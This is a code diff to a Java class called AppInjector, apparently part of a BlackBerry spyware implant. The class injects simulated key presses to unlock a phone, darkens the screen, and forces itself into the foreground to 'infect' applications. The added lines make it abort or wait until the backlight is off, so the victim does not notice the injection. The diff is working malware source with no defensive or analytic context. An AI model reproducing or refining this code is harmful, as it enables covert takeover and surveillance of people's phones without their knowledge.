@@ -120,7 +120,7 @@ public class AppInjector {
 
         Utils.sleep(delegate.getDelay());
 
-        if ( isInfected()) {
+        if (isInfected()) {
             //#ifdef DEBUG
             debug.trace("infected, bailing out");
             //#endif
@@ -128,11 +128,18 @@ public class AppInjector {
         }
 
         Backlight.enable(false);
-        
+
         unLock();
 
+        if (Backlight.isEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("infected: fail");
+            //#endif
+            return;
+        }
+
         int req = requestForeground();
-        
+
         Utils.sleep(200);
         boolean fore = checkForeground();
 
@@ -154,15 +161,22 @@ public class AppInjector {
     private void unLock() {
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(200);
-        if(Backlight.isEnabled()){            
+        if (Backlight.isEnabled()) {
             //#ifdef DEBUG
-            debug.trace("Backlight still enabled, getHardwareLayout: " + Keypad.getHardwareLayout());
+            debug.trace("Backlight still enabled, getHardwareLayout: "
+                    + Keypad.getHardwareLayout());
             //#endif
-            
+
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             Backlight.enable(false);
-            Utils.sleep(500);
+
+            for (int i = 0; i < 20; i++) {
+                if (Backlight.isEnabled()) {
+                    Utils.sleep(500);
+                }
+            }
+            
             return;
         }
     }
